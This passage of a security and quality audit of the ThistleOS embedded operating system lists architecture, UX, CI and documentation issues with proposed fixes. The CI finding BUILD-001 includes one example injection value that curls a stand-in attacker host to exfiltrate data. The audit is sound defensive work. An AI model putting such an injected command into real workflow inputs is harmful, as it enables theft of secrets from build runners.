- **Issue:** Missing HAL interfaces (`hal_network_driver_t`, `hal_nvm_driver_t`) despite claims in AGENTS.md. Core drivers (e-paper, LCD, OLED, touch, keyboard) are compiled into `kernel_rs` rather than loaded as `.drv.elf` files from SPIFFS/SD.
- **Fix:** Move all `drv_*` modules from `kernel_rs` to standalone Rust crates; compile them as `.drv.elf` shared objects; update `board.json` to reference driver IDs; implement driver manifest parsing for architecture-aware installation.

### ARCH-010 — App lifecycle not resilient to OOM or crash
- **Type:** Robustness
- **Severity:** MEDIUM
- **Files:** `components/kernel_rs/src/app_manager.rs`
- **Issue:** App launch has basic OOM handling but no crash recovery: no watchdog monitoring, no launch timeout, no crash detection, and no restart policy for backgrounded apps.
- **Fix:** Add task watchdog to monitor app task health; implement app timeout during launch; add crash detection and UI notification; implement auto-restart policy; add periodic slot cleanup for zombie apps.

### ARCH-011 — Signing verification bypassed for some loaders
- **Type:** SecurityGap
- **Severity:** MEDIUM
- **Files:** `components/kernel_rs/src/elf_loader.rs`, `driver_loader.rs`, `display_server.rs`
- **Issue:** Manifest signing is required for apps/drivers but `display_server_load_wm` is stubbed and doesn't verify signatures. There is no validation that manifest matches loaded ELF, and permission enforcement is incomplete.
- **Fix:** Implement signature verification for all loadable entities; add validation tests for permission denial paths; implement pointer boundary checks for syscall arguments; add integration tests for unsigned app rejection.

### ARCH-012 — Board configuration loading has no fallback
- **Type:** Robustness
- **Severity:** MEDIUM
- **Files:** `components/kernel_rs/src/board_config.rs`
- **Issue:** Boot-time `board.json` loading is required but has no fallback if the file is missing/corrupted, no hardware autodetection on failure, and Recovery OS hardware scanning is not integrated.
- **Fix:** Add fallback to builtin board config or generic defaults; integrate Recovery OS autodetection at runtime; add `board.json` validation and repair utilities; implement watchdog timeout during board init.

### ARCH-013 — OTA upgrade path incomplete
- **Type:** FeatureGap
- **Severity:** MEDIUM
- **Files:** `recovery/src/recovery_ota.rs`, `components/kernel_rs/src/ota.rs`
- **Issue:** OTA architecture is documented but incomplete: no rollback on corrupted kernel, no OTA progress reporting to user, and no OTA cancellation mechanism.
- **Fix:** Implement OTA state machine with rollback; add progress reporting syscall; implement watchdog-based rollback on hang; add user-facing update cancel UI; test on target hardware.

### ARCH-014 — Test coverage gaps — no integration tests
- **Type:** QualityAssurance
- **Severity:** MEDIUM
- **Files:** `.github/workflows/tests.yml`, `simulator/`
- **Issue:** 1,231 Rust unit tests exist but no integration tests for driver loading/lifecycle, app installation/sandboxing, OTA firmware update flow, board detection/fallback, messenger transport fallback, or WiFi state transitions. Simulator has no automated test suite; no fuzz or stress testing.
- **Fix:** Add integration test suite in `components/test_thistle/`; implement driver loading/hot-reload tests; add app sandboxing validation tests; implement OTA flow test with rollback verification; add fuzzing for manifest and ELF parsing; implement stress tests for memory exhaustion.

### ARCH-015 — Display server assumes single window manager
- **Type:** DesignLimitation
- **Severity:** MEDIUM
- **Files:** `components/kernel_rs/src/display_server.rs`
- **Issue:** Display server has a single WM vtable. Architecture claims swappable WMs but only one WM can be active at a time, with no multi-WM coordination, priority, or focus management. LVGL and thistle-tk WMs are mutually exclusive.
- **Fix:** Extend display server to support WM layering (launcher + app); add WM focus/priority management; implement smooth WM transitions.

### ARCH-016 — Documentation inconsistencies
- **Type:** DocumentationGap
- **Severity:** LOW-MEDIUM
- **Files:** `README.md`, `AGENTS.md`, `ROADMAP.md`
- **Issue:** README claims "57 modules" but `lib.rs` shows 77 public modules. AGENTS.md describes "Crypto HAL" but HTTP client calls go direct to ESP-IDF. README says drivers are loaded from SPIFFS but core drivers are compiled in. Simulator coverage limits are not mentioned.
- **Fix:** Audit all architecture claims against actual implementation; mark incomplete features as experimental or stubbed; add feature matrix from ROADMAP to README; document simulator coverage limits; keep docs in sync with code via CI check.

### ARCH-017 — Incomplete messenger transports advertised as working
- **Type:** IncompleteFeature
- **Severity:** LOW-MEDIUM
- **Files:** `components/kernel_rs/src/ble_manager.rs`, `wifi_manager.rs`, documented in `ROADMAP.md`
- **Issue:** Messenger app advertises LoRa (working), BLE (scaffolded, send/receive incomplete), Internet (scaffolded, send/receive incomplete), and SMS (partially validated). Users enable transports thinking they work and messages are silently lost.
- **Fix:** Finish BLE framing and send/receive; implement Internet transport or hide it; validate SMS on modem hardware; update UI to only show working transports; add transport availability detection.

### ARCH-018 — Partial platform support claims
- **Type:** Documentation / FeatureTruth
- **Severity:** LOW
- **Files:** `ROADMAP.md:180-200`
- **Issue:** Feature matrix claims partial support for WiFi, battery reporting, light sensor, and driver hot reload, but this is not surfaced clearly in user-facing docs.
- **Fix:** Update feature matrix in docs to match ROADMAP; mark partial features clearly; add hardware validation checklist; document which boards have validated drivers.

### CODE-001 — Rust static mutable state antipattern
- **Type:** CodeQuality
- **Severity:** MEDIUM
- **Files:** Throughout `components/kernel_rs/src/`
- **Issue:** 40+ instances of `static mut` or `thread_local` emulate global variables, which is an anti-pattern in safe Rust.
- **Fix:** Replace all `static mut` with `Mutex` or `OnceLock`; add synchronization for concurrent access; document why each pattern is necessary.

### CODE-002 — Inconsistent error handling patterns
- **Type:** CodeQuality
- **Severity:** MEDIUM
- **Files:** Throughout `components/kernel_rs/src/`
- **Issue:** 714 unwrap/expect calls with inconsistent handling: some modules use `Result<T, Error>` properly, others use `.unwrap_or("")` silently, and others use `.unwrap_or_default()`.
- **Fix:** Establish error handling policy (critical paths use `Result` with `?` propagation, UI paths use `.unwrap_or_default()` with logging, initialization may panic); add clippy lint to catch unnecessary unwraps; review and fix panic points.

### CODE-003 — Build system fragility
- **Type:** BuildSystem
- **Severity:** MEDIUM
- **Files:** `CMakeLists.txt`, `components/kernel_rs/CMakeLists.txt`, `.github/workflows/build.yml`
- **Issue:** Cargo cache is not invalidated when C headers change; Rust toolchain is pinned to espup 0.16.0 due to a known regression; no partition table consistency check during build; Recovery OS and main firmware are built separately with no compatibility validation.
- **Fix:** Add build dependency tracking for Rust/C FFI; implement partition table validation in CMake; add version compatibility check between Recovery and Kernel; document toolchain dependencies and known regressions.

---

## 4. UI / UX / Usability

### UX-001 — Incomplete messenger transports registered as available
- **Type:** UX / Usability
- **Severity:** HIGH
- **Files:** `components/apps_builtin/messenger/messenger_transport.c:1-15`, `components/apps_builtin/messenger/messenger_ui.c:5-23`
- **Issue:** BLE and Internet transports are registered at startup even though send/receive is not implemented. Users see these options in the transport picker, tap them, and encounter confusing `NOT_SUPPORTED` errors or failures.
- **Fix:** Only register transports if their `is_available()` check returns true; filter the transport picker UI to exclude unavailable transports; provide explicit status messaging such as "BLE transport coming in v0.2".

### UX-002 — Raw error codes shown to users
- **Type:** UX
- **Severity:** MEDIUM
- **Files:** `components/apps_builtin/messenger/messenger_transport.c:97-100`, `components/apps_builtin/launcher/launcher_ui.c:88-93`
- **Issue:** Error handling uses `esp_err_to_name(ret)` which returns machine-readable codes like `ESP_ERR_NOT_SUPPORTED`. Users see technical error names instead of actionable messages.
- **Fix:** Map error codes to user-friendly messages; create an error message lookup table with messages such as "This device doesn't have WiFi. Check hardware board configuration."

### UX-003 — Hardcoded display dimensions throughout apps
- **Type:** UX / Usability
- **Severity:** MEDIUM
- **Files:** `components/apps_builtin/settings/settings_ui.c:45-46`, `components/apps_builtin/messenger/messenger_ui.c:55-60`, `components/apps_builtin/assistant/assistant_ui.c:49-53`, `components/apps_builtin/launcher/launcher_ui.c:19-20`, `components/apps_builtin/terminal/terminal_ui.c:55-57`
- **Issue:** All apps hardcode display size to 240×296 (T-Deck default). New boards with different resolutions (e.g., T-Display-S3 at 320×170) will have broken UI layouts, text cutoff, or scroll issues.
- **Fix:** Query display dimensions at app startup using `lv_display_get_hor_res()` and `lv_display_get_ver_res()`; use percentage-based or relative layouts; implement responsive grid/flex layouts; test on multiple board configurations in CI.

### UX-004 — Inconsistent status bar height assumptions
- **Type:** UX / Usability
- **Severity:** LOW
- **Files:** `components/apps_builtin/messenger/messenger_ui.c:58`, `components/apps_builtin/assistant/assistant_ui.c:51-52`, `components/apps_builtin/settings/settings_ui.c:47-51`
- **Issue:** Each app independently defines header/input bar heights. If the WM or theme changes these dimensions, all apps break.
- **Fix:** Export header/footer heights from window manager as kernel syscalls; create a shared UI constants header that WM and apps can reference (e.g., `uint16_t thistle_ui_get_statusbar_height(void)`).

### UX-005 — App icon mapping uses brittle string matching
- **Type:** CodeQuality / UX
- **Severity:** MEDIUM
- **Files:** `components/apps_builtin/launcher/launcher_ui.c:54-70`
- **Issue:** Icon selection uses `strstr()` to match app IDs. This is fragile and doesn't scale; future apps with similar names will break.
- **Fix:** Store icon/metadata in app manifest (JSON); use first letter of app name or emoji fallback; implement icon pack system; query app metadata from manifest store syscall.

### UX-006 — "App not available" message lacks context
- **Type:** UX
- **Severity:** LOW
- **Files:** `components/apps_builtin/launcher/launcher_ui.c:91-93`
- **Issue:** When app launch fails, the user sees "App not available" with no hint about why (not installed, crashed, missing permissions, etc.).
- **Fix:** Add detailed error reasons: "App crashed", "Insufficient storage", "Device not supported"; log error details to console; provide action hints such as "Reinstall from App Store?".

### UX-007 — WiFi/BLE status updates lack real-time feedback
- **Type:** UX / Usability
- **Severity:** MEDIUM
- **Files:** `components/apps_builtin/settings/settings_ui.c:76-87`
- **Issue:** WiFi and BLE status labels update on a timer, but there is no loading/connecting state visual feedback, no user-visible progress during connection, no clear error messages on failure, and no disconnect/reconnect button.
- **Fix:** Add state machine: `idle → connecting → connected | error`; show spinner/progress bar during connection; display specific errors such as "Wrong password", "No network found", "Connection timeout"; add button to retry or forget network.

### UX-008 — Driver details missing accessibility information
- **Type:** UX / Usability
- **Severity:** LOW
- **Files:** `components/apps_builtin/settings/settings_ui.c:112-150`
- **Issue:** Driver detail screens show raw driver status but don't explain what drivers are or why they matter. New users won't understand the device health implications.
- **Fix:** Add brief explanatory tooltips: "Drivers are software that controls hardware. All drivers present = device healthy."; show driver status clearly: "✓ Loaded", "✗ Failed", "⏳ Loading"; link to documentation.

### UX-009 — Conversation list empty state not handled
- **Type:** UX / Usability
- **Severity:** LOW
- **Files:** `components/apps_builtin/messenger/messenger_ui.c:326-385`
- **Issue:** When there are no conversations (first launch), the app shows a blank screen with a `[+]` button. New users won't understand how to start.
- **Fix:** Show empty state message: "No messages yet. Tap [+] to pick a transport."; display available transports with status; suggest action: "Try LoRa broadcast to nearby devices".

### UX-010 — Message sender identity format unclear
- **Type:** UX
- **Severity:** LOW
- **Files:** `components/apps_builtin/messenger/messenger_transport.c:77-78`
- **Issue:** Sender is displayed as "Node-08A5F2B1" (device ID in hex). Users can't tell which device sent the message without memorizing hex IDs.
- **Fix:** Allow users to set device name in Settings; store name → device_id mapping; display: "Alice's T-Deck (Node-08A5...)"; add contact management to Messenger.

### UX-011 — No "help" command or command reference in terminal
- **Type:** Documentation / UX
- **Severity:** MEDIUM
- **Files:** `components/apps_builtin/terminal/terminal_ui.c:1-50`
- **Issue:** Terminal supports 22 commands but users discover them by trial and error. No `help` command, no command completion, no `man` pages.
- **Fix:** Implement `help` command showing available commands with brief descriptions; add tab completion for command names; show usage on invalid command: "usage: echo <text>".

### UX-012 — Terminal output truncated silently
- **Type:** UX / Usability
- **Severity:** LOW
- **Files:** `components/apps_builtin/terminal/terminal_ui.c:59-60`
- **Issue:** Output textarea limited to 2048 characters. Longer output is truncated without user notification.
- **Fix:** Show warning when output is truncated: "[Output truncated — scroll up for more]"; increase buffer or implement circular buffer; save full output to SD card with `save` command.

### UX-013 — Assistant JSON parsing via `strstr()` is fragile
- **Type:** CodeQuality
- **Severity:** MEDIUM
- **Files:** `components/apps_builtin/assistant/assistant_ui.c:80-120`
- **Issue:** API responses are parsed with `strstr()` instead of a real JSON parser. This breaks if response format changes or contains escaped quotes.
- **Fix:** Use a lightweight JSON parser (cJSON, jsoncons, etc.); add error handling for malformed JSON; validate required fields before using them; add unit tests for parsing edge cases.

### UX-014 — Assistant API configuration requires manual JSON file editing
- **Type:** DeveloperExperience / UX
- **Severity:** MEDIUM
- **Files:** `components/apps_builtin/assistant/assistant_ui.c:9-18`
- **Issue:** Users must edit `THISTLE_SDCARD/config/assistant.json` manually to set API credentials. No UI for this.
- **Fix:** Add Settings screen for API configuration; or provide CLI tool/web UI in Recovery to configure; store credentials securely (encrypted on SD card); show clear error if API key is missing.

### UX-015 — Hardcoded display dimensions in LVGL window manager
- **Type:** Usability
- **Severity:** MEDIUM
- **Files:** `components/ui/src/lvgl_wm.c`
- **Issue:** Window manager likely also assumes 240×296 based on app patterns.
- **Fix:** Query actual display from HAL at startup; use relative positioning for all UI elements; test on multiple board resolutions.

### UX-016 — No theme switching feedback
- **Type:** UX / Usability
- **Severity:** LOW
- **Files:** `components/apps_builtin/settings/settings_ui.c:280`
- **Issue:** When user changes theme in Settings, no visual confirmation or animation. User unsure if change took effect.
- **Fix:** Flash screen or show toast: "Theme changed to Dark"; show preview of theme before applying; add "Apply" / "Cancel" buttons for themes.

### UX-017 — Recovery web UI IP hardcoded
- **Type:** UX / Usability
- **Severity:** LOW
- **Files:** `recovery/src/recovery_web.rs:100+`
- **Issue:** Recovery web UI is served at a hardcoded IP (192.168.4.1 in embedded HTML). If user accidentally connects to wrong WiFi, no fallback discovery method.
- **Fix:** Display QR code with connection URL; support mDNS discovery: `http://thistle-recovery.local`; show clear instructions: "Open browser to http://192.168.4.1 on the network named 'ThistleOS-Recovery'".

### UX-018 — Board selection lacks compatibility warnings
- **Type:** UX / Usability
- **Severity:** MEDIUM
- **Files:** `recovery/src/recovery_web.rs:72-100`
- **Issue:** Recovery OS shows all boards regardless of chip type. User can select incompatible board and get flash errors.
- **Fix:** Only show boards matching detected chip type; gray out incompatible boards with explanation: "Not compatible with your ESP32-S3"; add "Detect Hardware" button to auto-select correct board.

### UX-019 — No progress indication during firmware download
- **Type:** UX / Usability
- **Severity:** LOW
- **Files:** `recovery/src/recovery_web.rs:200+`
- **Issue:** During recovery download, UI shows "idle" | "downloading" | "complete" | "error" but no actual progress percentage (0-100) displayed.
- **Fix:** Show progress bar with percent: "Downloading firmware... 45%"; show ETA based on current speed; allow cancel during download.

### UX-020 — `board.json` schema lacks validation
- **Type:** DeveloperExperience
- **Severity:** MEDIUM
- **Files:** `sdcard_layout/config/boards/tdeck-pro.json` (all board configs)
- **Issue:** Board JSON has complex nested structure with no formal schema or validation. Easy to make mistakes: wrong GPIO numbers, mismatched bus indices, missing required fields, no IDE autocomplete/hints.
- **Fix:** Create JSON Schema (`schema.json`) for board definitions; distribute schema with tooling; add validation in boot: reject invalid board configs with clear error; provide VSCode extension for autocomplete.

### UX-021 — Configuration error messages unclear
- **Type:** DeveloperExperience
- **Severity:** MEDIUM
- **Files:** Various
- **Issue:** When `board.json` has errors (wrong pin, missing field), kernel logs are cryptic or missing.
- **Fix:** Add detailed config validation at boot; log specific errors: "GPIO 999 is invalid. Valid range: 0-48 on ESP32-S3"; provide recovery suggestion: "Check sdcard/config/boards/tdeck-pro.json".

### UX-022 — Missing onboarding documentation
- **Type:** Documentation
- **Severity:** HIGH
- **Files:** `README.md`, `docs/`
- **Issue:** README is comprehensive but lacks quick start for end users (not developers), step-by-step first-boot experience, troubleshooting common issues, and screenshots of key screens.
- **Fix:** Add "User Quick Start" section with photos; document first-boot sequence; add "If X happens, do Y" troubleshooting; create setup video tutorial.

### UX-023 — App development documentation lacks examples
- **Type:** Documentation
- **Severity:** MEDIUM
- **Files:** `docs/app-development.html`, `app_sdk/examples/`
- **Issue:** App SDK header exists but examples are minimal. New developers struggle with how to link against syscalls, build and sign ELFs, test on simulator, and package for app store.
- **Fix:** Add 3-5 working examples (button, display, storage, network, etc.); step-by-step build guide with troubleshooting; document simulator testing workflow; provide Makefile or CMake template.

### UX-024 — Simulator truthfulness not documented
- **Type:** Documentation
- **Severity:** MEDIUM
- **Files:** `docs/simulator-testing.html`, `ROADMAP.md:33-34`
- **Issue:** Simulator behavior is not clearly documented. Developers unsure what works vs. what's stubbed.
- **Fix:** Create feature parity matrix (simulator vs real hardware); document stubbed/incomplete features; add tests for simulator coverage; mark docs as "reliable" vs. "experimental".

### UX-025 — No architecture diagrams for app lifecycle
- **Type:** Documentation
- **Severity:** LOW
- **Files:** `docs/architecture.html`
- **Issue:** Architecture docs explain kernel but lack visual flowcharts for app startup/shutdown lifecycle, window manager handshake with display server, IPC message flow, and driver loading sequence.
- **Fix:** Add sequence diagrams (Mermaid or SVG); show state machines for app states; illustrate message flow for common operations.

### UX-026 — No localization support
- **Type:** Usability
- **Severity:** LOW
- **Files:** All UI files
- **Issue:** All UI strings are hardcoded in English. No localization framework.
- **Fix:** Implement string tables/resources; support at least 3-5 common languages (Spanish, German, French, Chinese, Japanese); use existing i18n library or simple string ID lookup.

### UX-027 — Font sizes not tested for readability
- **Type:** Accessibility
- **Severity:** LOW
- **Files:** Multiple UI files
- **Issue:** Font sizes hardcoded (e.g., `lv_font_montserrat_14`). No testing for contrast ratios (WCAG AAA), readability at arm's length, or dark theme readability.
- **Fix:** Use theme-aware font sizing; ensure contrast ratio ≥ 7:1 for text; add high-contrast theme option; test on actual devices with different lighting.

### UX-028 — No data backup/export for user content
- **Type:** UX / Feature
- **Severity:** MEDIUM
- **Files:** Various
- **Issue:** User data (conversations, settings, assistant chat history) lives on device only. No export/backup mechanism if device is lost or factory reset.
- **Fix:** Add "Export Data" in Settings; support cloud backup option (optional); provide factory reset confirmation with backup prompt.

### UX-029 — App state not persisted across reboots
- **Type:** Usability
- **Severity:** LOW
- **Files:** App implementations
- **Issue:** Apps don't automatically save scroll position, input text, or UI state. User loses progress if app crashes or device reboots.
- **Fix:** Add app state persistence syscall; document best practices for save/restore; auto-save state before crash/shutdown.

### UX-030 — App signing workflow is manual and error-prone
- **Type:** DeveloperExperience
- **Severity:** MEDIUM
- **Files:** `tools/sign_elf.py`, `tools/sign.py`
- **Issue:** Developers must manually run `sign_elf.py` for each app. No integration with build system.
- **Fix:** Integrate signing into CMake/Cargo workflows; auto-sign during `make install` or deployment; verify signatures are correct before flashing; clear error messages on signing failures.

### UX-031 — Board catalog build tool lacks documentation
- **Type:** DeveloperExperience
- **Severity:** MEDIUM
- **Files:** `tools/build_board_catalog.py`, `tools/build_catalog.py`
- **Issue:** Catalog generation tool exists but no docs on how to create new catalogs or update existing ones.
- **Fix:** Add detailed README in `tools/`; document catalog schema; provide example catalog generation script; show how to host custom catalog.

### UX-032 — Partition size validation not user-friendly
- **Type:** DeveloperExperience
- **Severity:** LOW
- **Files:** `tools/check_partition_sizes.py`
- **Issue:** Tool checks partition sizes but error messages may be cryptic. New developers won't understand how to fix.
- **Fix:** Add human-readable size reports; suggest optimizations (strip debug symbols, reduce LTO); show what changed if partition is too large.

### UX-033 — Inconsistent toast/error message placement
- **Type:** UX / Usability
- **Severity:** LOW
- **Files:** Multiple
- **Issue:** Error toasts appear in inconsistent locations and with different styling/duration.
- **Fix:** Create unified error message system; standard toast duration (2-3s for success, 5s for error); always show at bottom of screen; use color scheme (green=success, red=error, blue=info).

### UX-034 — No unified loading state indicator
- **Type:** UX / Usability
- **Severity:** MEDIUM
- **Files:** Multiple
- **Issue:** Apps show loading differently (spinner, progress bar, or nothing). No standard loading indicator.
- **Fix:** Create shared loading spinner widget; document expected load times; cancel long operations if taking > 10s; show user-friendly timeout message.

### UX-035 — Missing "What's New" / changelog in-app
- **Type:** UX
- **Severity:** LOW
- **Files:** All built-in apps
- **Issue:** Users can't see what changed in their OS update. No in-app changelog.
- **Fix:** Show changelog on first boot after update; add "What's New" screen in Settings; link to `CHANGELOG.md` or release notes.

---

## 5. Build / CI / Tooling

### BUILD-001 — CI release workflow vulnerable to expression injection
- **Type:** StringInjection / CommandInjection
- **Severity:** HIGH
- **Files:** `.github/workflows/release.yml:29`, `35`
- **Issue:** `${{ inputs.tag }}` and `${{ inputs.run_id }}` are interpolated directly into shell `run` blocks. A user-supplied tag like `$(curl attacker.com/exfil)` or a run_id containing shell metacharacters will execute in the workflow runner.
- **Fix:** Assign inputs to environment variables and reference the variables in the shell scripts; GitHub Actions will not expand `${{ }}` inside shell strings when passed through env.

### BUILD-002 — App-signing workflow exposes signing key in process arguments
- **Type:** SensitiveDataLeak
- **Severity:** HIGH
- **Files:** `.github/workflows/apps.yml:79`
- **Issue:** The `SIGNING_KEY` secret is passed to `sign_elf.py` as `--key "$SIGNING_KEY"` on the command line. The key is visible in `/proc/*/cmdline` to any process on the runner and may be captured by logs or telemetry.
- **Fix:** Write the signing key to a temporary file (or use an environment variable) and pass the file path; never place secrets on a command line.

### BUILD-003 — LVGL dependency cloned by mutable tag
- **Type:** SupplyChainAttack
- **Severity:** MEDIUM
- **Files:** `.github/workflows/pages.yml:72`, `.github/workflows/tests.yml:91`, `142`
- **Issue:** CI clones `https://github.com/lvgl/lvgl.git` with `--branch v9.2.2`. Tags can be force-moved or deleted, so a future build may pull different code without warning.
- **Fix:** Pin to an immutable commit SHA and verify it (or use a vendored/submodule reference with SHA).

### BUILD-004 — Cargo cache not invalidated when C headers change
- **Type:** BuildSystem
- **Severity:** MEDIUM
- **Files:** `components/kernel_rs/CMakeLists.txt`
- **Issue:** Rust/C FFI bindings are not rebuilt when underlying C headers change, leading to stale or inconsistent binaries.
- **Fix:** Add explicit build dependency tracking for C headers in the CMake/Cargo integration; touch bindgen inputs when headers change.

### BUILD-005 — Rust toolchain pinned to old espup version
- **Type:** BuildSystem
- **Severity:** MEDIUM
- **Files:** `.github/workflows/build.yml:36-40`
- **Issue:** Toolchain is pinned to espup 0.16.0 due to a known regression in 0.17.0, indicating fragile dependency management.
- **Fix:** Document the regression and migration path; upgrade when upstream fixes the issue; add CI matrix testing with supported toolchain versions.

### BUILD-006 — No partition table consistency check during build
- **Type:** BuildSystem
- **Severity:** MEDIUM
- **Files:** `CMakeLists.txt`, `tools/check_partition_sizes.py`
- **Issue:** Partition table issues are not caught until flashing, even though a checker script exists.
- **Fix:** Integrate `check_partition_sizes.py` into the CMake build as a post-link step; fail the build if partitions are exceeded.

### BUILD-007 — Recovery and kernel firmware compatibility not validated
- **Type:** BuildSystem
- **Severity:** MEDIUM
- **Files:** `.github/workflows/build.yml`
- **Issue:** Recovery OS and main firmware are built separately with no validation that they are compatible (version, ABI, partition layout).
- **Fix:** Add a version compatibility check between Recovery and Kernel; enforce a single source of truth for shared constants; add a combined build target.

### BUILD-008 — App signing workflow not integrated with build system
- **Type:** DeveloperExperience
- **Severity:** MEDIUM
- **Files:** `tools/sign_elf.py`, `tools/sign.py`, `apps/`, `standalone_apps/`
- **Issue:** Developers must manually run signing tools for each app. No integration with CMake/Cargo workflows.
- **Fix:** Integrate signing into CMake/Cargo workflows; auto-sign during `make install` or deployment; verify signatures before flashing.

### BUILD-009 — Board catalog build tools lack documentation
- **Type:** DeveloperExperience
- **Severity:** MEDIUM
- **Files:** `tools/build_board_catalog.py`, `tools/build_catalog.py`
- **Issue:** Catalog generation tools exist but have no documentation on how to create new catalogs or update existing ones.
- **Fix:** Add detailed README in `tools/`; document catalog schema; provide example catalog generation script; show how to host a custom catalog.

### BUILD-010 — Partition size validation messages are cryptic
- **Type:** DeveloperExperience
- **Severity:** LOW
- **Files:** `tools/check_partition_sizes.py`
- **Issue:** Error messages from the partition checker may be hard for new developers to understand.
- **Fix:** Add human-readable size reports; suggest optimizations (strip debug symbols, reduce LTO); show what changed if a partition is too large.

---

## 6. Documentation

### DOCS-001 — Missing user onboarding guide
- **Type:** Documentation
- **Severity:** HIGH
- **Files:** `README.md`, `docs/`
- **Issue:** README targets developers but lacks a quick-start for end users, first-boot walkthrough, troubleshooting, and screenshots.
- **Fix:** Add "User Quick Start" section with photos; document first-boot sequence; add "If X happens, do Y" troubleshooting; create setup video tutorial.

### DOCS-002 — App development documentation lacks examples
- **Type:** Documentation
- **Severity:** MEDIUM
- **Files:** `docs/app-development.html`, `app_sdk/examples/`
- **Issue:** App SDK header exists but examples are minimal. New developers struggle with syscalls, signing, simulator testing, and app store packaging.
- **Fix:** Add 3-5 working examples (button, display, storage, network, etc.); step-by-step build guide with troubleshooting; document simulator testing workflow; provide Makefile or CMake template.

### DOCS-003 — Simulator parity not documented
- **Type:** Documentation
- **Severity:** MEDIUM
- **Files:** `docs/simulator-testing.html`, `ROADMAP.md:33-34`
- **Issue:** Simulator behavior is not clearly documented. Developers are unsure what works vs. what's stubbed.
- **Fix:** Create feature parity matrix (simulator vs real hardware); document stubbed/incomplete features; add tests for simulator coverage; mark docs as "reliable" vs. "experimental".

### DOCS-004 — No architecture diagrams for key flows
- **Type:** Documentation
- **Severity:** LOW
- **Files:** `docs/architecture.html`
- **Issue:** Architecture docs explain kernel but lack visual flowcharts for app lifecycle, WM handshake, IPC flow, and driver loading sequence.
- **Fix:** Add sequence diagrams (Mermaid or SVG); show state machines for app states; illustrate message flow for common operations.

### DOCS-005 — Architecture claims inconsistent with implementation
- **Type:** DocumentationGap
- **Severity:** LOW-MEDIUM
- **Files:** `README.md`, `AGENTS.md`, `ROADMAP.md`
- **Issue:** README claims "57 modules" but `lib.rs` shows 77 public modules. AGENTS.md describes "Crypto HAL" but HTTP client calls go direct to ESP-IDF. README says drivers are loaded from SPIFFS but core drivers are compiled in.
- **Fix:** Audit all architecture claims against actual implementation; mark incomplete features as experimental or stubbed; add feature matrix from ROADMAP to README; document simulator coverage limits; keep docs in sync with code via CI check.

### DOCS-006 — Partial platform support not surfaced
- **Type:** Documentation / FeatureTruth
- **Severity:** LOW
- **Files:** `ROADMAP.md:180-200`
- **Issue:** Feature matrix claims partial support for WiFi, battery reporting, light sensor, and driver hot reload, but this is not surfaced clearly in user-facing docs.
- **Fix:** Update feature matrix in docs to match ROADMAP; mark partial features clearly; add hardware validation checklist; document which boards have validated drivers.

### DOCS-007 — Board configuration schema undocumented
- **Type:** DeveloperExperience
- **Severity:** MEDIUM
- **Files:** `sdcard_layout/config/boards/`
- **Issue:** `board.json` structure is complex and undocumented. New board contributors must reverse-engineer existing files.
- **Fix:** Create JSON Schema for board definitions; add a "Adding a New Board" guide with examples; document every field and valid values.

### DOCS-008 — Recovery provisioning flow undocumented
- **Type:** Documentation
- **Severity:** MEDIUM
- **Files:** `recovery/`, `docs/`
- **Issue:** The 3-step recovery web UI provisioning flow is mentioned but not documented for users or developers.
- **Fix:** Document the provisioning flow with screenshots; explain board selection, WiFi setup, and firmware download steps; document security considerations.

### DOCS-009 — SDK examples for drivers are minimal
- **Type:** Documentation
- **Severity:** MEDIUM
- **Files:** `driver_sdk/`, `standalone_drivers/`
- **Issue:** Driver SDK has limited examples. New driver authors lack guidance on HAL vtable implementation, bus handle usage, and manifest signing.
- **Fix:** Add a complete standalone driver example; document the HAL vtable contract; explain how to build, sign, and load a `.drv.elf`.

### DOCS-010 — No troubleshooting FAQ
- **Type:** Documentation
- **Severity:** LOW
- **Files:** `docs/`
- **Issue:** Common issues (boot loops, driver load failures, app crashes, SD card not detected) are not documented.
- **Fix:** Create a troubleshooting FAQ with symptoms, causes, and remediation steps; link from README and Recovery UI.

### DOCS-011 — Stray development artifacts in repository root
- **Type:** RepositoryHygiene
- **Severity:** LOW
- **Files:** `loop.md`, `ralph-loop-log.md`, `pico.save`, `personas.md`
- **Issue:** Several files in the repository root appear to be personal development logs or editor artifacts rather than project documentation.
- **Fix:** Review and remove or relocate these files; add patterns to `.gitignore` if they are generated by local tooling; keep the repository root focused on project-level documentation.

---

## 7. Cross-Cutting Recommendations

### Immediate (P0) — Security and Stability
1. Fix signature bypasses in kernel SD OTA (SEC-001) and app-store client (SEC-002).
2. Add authentication to Recovery captive-portal mutating endpoints (SEC-003).
3. Enable TLS certificate validation in Recovery and app-store HTTPS clients (SEC-004, SEC-005).
4. Fix `CManifest` buffer overflows in ELF and driver loaders (BUG-001, BUG-002).
5. Fix 64-bit pointer truncation in LVGL WM (BUG-003).
6. Add permission checks to HAL registration and input callback syscalls (SEC-007, SEC-017).
7. Implement path sandboxing for `thistle_fs_open` (SEC-008).

### Short-Term (P1) — Architecture and Reliability
1. Remove direct ESP-IDF HTTP calls from the kernel (ARCH-001).
2. Add synchronization to HAL registry (ARCH-002).
3. Fix weak linker stub resolution (ARCH-003).
4. Complete driver hot-reload lifecycle (ARCH-004).
5. Implement runtime WM loading (ARCH-005).
6. Reduce `unwrap()` usage and add error recovery (ARCH-006, ARCH-008).
7. Add integration tests for driver/app loading and OTA (ARCH-014).

### Medium-Term (P2) — UX and Documentation
1. Filter unavailable messenger transports from the UI (UX-001).
2. Make UI layouts responsive to actual display dimensions (UX-003).
3. Add user onboarding documentation and troubleshooting FAQ (DOCS-001, DOCS-010).
4. Expand SDK examples for apps and drivers (DOCS-002, DOCS-009).
5. Add unified loading, error, and empty-state patterns across apps (UX-033, UX-034).
6. Implement Recovery web UI improvements: board compatibility, progress bars, mDNS (UX-018, UX-019, UX-017).

### Ongoing — Process and Hygiene
1. Keep documentation claims in sync with implementation (DOCS-005).
2. Add CI checks for partition sizes, linker symbol resolution, and doc consistency.
3. Remove stray development artifacts from the repository root (DOCS-011).
4. Establish a security review checklist for new syscalls and loadable formats.

---

## Conclusion

ThistleOS has a sound three-tier immutable trust chain and a well-conceived hardware abstraction model, but the review identified **133 issues** spanning security vulnerabilities, memory-safety bugs, architectural violations, incomplete features, UI/UX friction, build fragility, and documentation gaps. The highest-priority work is closing signature bypasses, adding authentication and TLS validation to the recovery and app-store flows, fixing memory-corruption bugs in the loaders, and aligning the implementation with the documented architecture. Addressing these will materially improve the security, stability, and usability of the platform.
